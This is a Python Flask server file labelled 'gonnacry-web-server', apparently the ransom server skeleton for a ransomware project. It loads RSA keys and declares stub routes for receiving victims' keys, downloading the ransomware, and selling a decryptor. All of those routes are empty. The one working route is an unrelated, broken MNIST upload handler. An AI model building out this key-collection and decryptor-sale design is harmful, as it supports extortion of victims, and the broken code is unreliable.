from flask import Flask, redirect, request
from flask import render_template, url_for
import os
import time
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

with open("private_key.key") as f:
    private_key = f.read()

with open("public_key.key") as f:
    public_key = f.read()

app = Flask("gonnacry-web-server")

@app.errorhandler(404)
def page_not_found(error):
	app.logger.error('Page not found: %s', (request.path))
	return render_template('404.html'), 404

@app.errorhandler(500)
def page_not_found(error):
	app.logger.error('Page not found: %s', (request.path))
	return render_template('404.html'), 404

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route("/recive-keys/", methods=['POST'])
def recive_keys():
    pass

@app.route('/classification', methods=['GET'])
def classification():
    return render_template('classification.html')

@app.route("/download-gonnacry/", methods=["GET"])
def download_gonnacry():
    pass

@app.route("/download-decryptor/", methods=["GET"])
def download_decryptor():
    pass

@app.route("/decrypt/", methods=['POST'])
def decrypt():
    pass

@app.route('/mnist', methods=['GET', 'POST'])
def mnist():
    if request.method == 'GET':
        return render_template('mnist.html')

    elif request.method == 'POST':
        # if file not send
        if 'file' not in request.files:
            flash('No file part')
            return redirect(url_for("mnist"), code=302)
        
        file = request.files['file']
        # if user does not select file, browser also
        # submit a empty part without filename
        if file.filename == '':
            flash('No selected file')
            return redirect(request.url)

        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            return redirect(url_for('uploaded_file',
                                    filename=filename))


if __name__ == '__main__':

    # Bind to PORT if defined, otherwise default to 5000.
    port = int(os.environ.get('PORT', 5000))
    app.run(host='127.0.0.1', port=port)